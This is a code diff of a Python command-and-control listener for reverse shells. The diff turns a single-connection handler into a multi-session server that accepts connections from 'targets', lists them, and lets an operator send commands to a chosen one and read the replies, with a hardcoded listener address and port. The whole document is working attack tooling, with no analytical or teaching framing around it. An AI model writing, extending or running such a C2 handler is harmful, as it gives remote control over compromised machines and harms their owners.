@@ -1,5 +1,7 @@
 import socket
 import sys
+import threading
+import base64
 
 def banner():
                                             
@@ -13,60 +15,80 @@ def banner():
     print("       88               88            88   ")
     print("       88               88            88       ")
 
-def comm_in(remote_target):
-    print('[+] Awaiting response..')
-    response = remote_target.recv(1024).decode()
+def comm_in(targ_id):
+    print(f'[+] Awaiting response..')
+    response = targ_id.recv(1024).decode()
     return response
 
-def comm_out(remote_target, message):
-    remote_target.send(message.encode())
+def comm_out(targ_id, message):
+    message = str(message)
+    targ_id.send(message.encode())
+
+def target_comm(targ_id):
+    while True:
+        message = input('send message#> ')
+        comm_out(targ_id, message)
+        if message == 'exit':
+            targ_id.send(message.encode())
+            targ_id.close()
+            break
+        if message == 'background':
+            break
+        else:
+            response = comm_in(targ_id)
+            if response == 'exit':
+                print('[-] The client has terminated the session. ')
+                targ_id.close()
+                break
+            print(response)
 
 def listener_handler():
     sock.bind((host_ip, host_port))
     print('[+] Awaiting connection from Client..')
     sock.listen()
-    remote_target, remote_ip = sock.accept()
-    targets.append([remote_target, remote_ip])
-    print(targets)
-    print(targets[0][1])
-    print(targets[0][1])
-    comm_handler(remote_target, remote_ip)
+    t1 = threading.Thread(target=comm_handler)
+    t1.start()
     
-def comm_handler(remote_target,remote_ip):
-    print(f'[+] Connection recieved from {remote_ip[0]}')
+def comm_handler():
     while True:
+        if kill_flag == 1:
+            break
         try:
-            message = input('Message to send#> ')
-            if message == 'exit':
-                remote_target.send(message.encode())
-                remote_target.close()
-                break
-            remote_target.send(message.encode())
-            response = remote_target.recv(1024).decode()
-            if response == 'exit':
-                print('[-] The client has terminated the session.')
-                remote_target.close()
-                break
-            print(response)
-        except KeyboardInterrupt:
-            print('[+] Keyboard interrupt issued.')
-            message = 'exit'
-            remote_target.send(message.encode())
-            sock.close()
-            break
-        except Exception:
-            remote_target.close()
-            break
+            remote_target, remote_ip = sock.accept()
+            targets.append([remote_target, remote_ip[0]])
+            print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command#> ', end='')
+        except:
+            pass
 
 if __name__ == '__main__':
     targets = []
     banner()
+    kill_flag = 0
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        host_ip = sys.argv[1]
-        host_port = int(sys.argv[2])
-        listener_handler()
+        host_ip = '192.168.106.1'
+        host_port = 2222
     except IndexError:
         print(' [-] Command Line argument(s) missing, Please Try again.')
     except Exception as e:
         print(e)
+    listener_handler()
+    while True:
+        try:
+            command = input('Enter command#> ')
+            if command.split(" ")[0] == 'sessions':
+                session_counter = 0
+                if command.split(" ")[1] == '-l':
+                    print('Session' + ' ' * 10 + 'Target')
+                    for target in targets:
+                        print(str(session_counter) + ' ' * 16 + target[1])
+                        session_counter += 1
+                if command.split(" ")[1] == '-i':
+                    num = int(command.split(" ")[2])
+                    targ_id = (targets[num])[0]
+                    target_comm(targ_id)
+        except KeyboardInterrupt:
+            print('\n[+] Keyboard interrupt issued. ')
+            kill_flag = 1
+            sock.close()
+            break
